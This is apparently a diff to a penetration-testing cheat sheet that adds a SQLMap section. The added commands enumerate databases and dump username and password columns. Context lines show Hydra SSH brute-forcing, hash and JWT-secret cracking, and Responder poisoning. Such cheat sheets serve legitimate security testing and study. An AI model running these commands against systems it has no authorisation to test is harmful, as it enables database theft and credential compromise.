@@ -61,7 +61,31 @@ gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdom
 
 ---
 
-## 4. THC-Hydra Authentication Cracking Cheat Sheet
+## 4. SQLMap Automated Injection Cheat Sheet
+
+```bash
+# Basic GET parameter test & database enumeration
+sqlmap -u "https://example.com/page.php?id=7" --dbs
+
+# Test saved Burp Suite request file
+sqlmap -r req.txt -p blood_group --dbs
+
+# Enumerate tables in a database
+sqlmap -r req.txt -D blood --tables
+
+# Enumerate columns in a table
+sqlmap -r req.txt -D blood -T users --columns
+
+# Dump specific column data
+sqlmap -r req.txt -D blood -T users -C username,password --dump
+
+# Automated batch mode through Burp proxy
+sqlmap -u "https://example.com/page.php?id=7" --batch --proxy="http://127.0.0.1:8080"
+```
+
+---
+
+## 5. THC-Hydra Authentication Cracking Cheat Sheet
 
 ```bash
 # HTTP Basic Authentication
@@ -76,7 +100,7 @@ hydra -L users.txt -P passwords.txt 192.168.10.20 ssh -t 4
 
 ---
 
-## 5. Offline Hash & Secret Cracking Cheat Sheet
+## 6. Offline Hash & Secret Cracking Cheat Sheet
 
 ```bash
 # John the Ripper - JWT HMAC-SHA256 Secret
@@ -97,7 +121,7 @@ hashcat -m 18200 -a 0 asrep_tickets.txt rockyou.txt
 
 ---
 
-## 6. Wireshark Packet Display Filters Cheat Sheet
+## 7. Wireshark Packet Display Filters Cheat Sheet
 
 ```text
 # Protocols
@@ -121,7 +145,7 @@ http contains "password"
 
 ---
 
-## 7. Active Directory & Network Testing Cheat Sheet
+## 8. Active Directory & Network Testing Cheat Sheet
 
 ```bash
 # Responder LLMNR/NBT-NS Poisoning
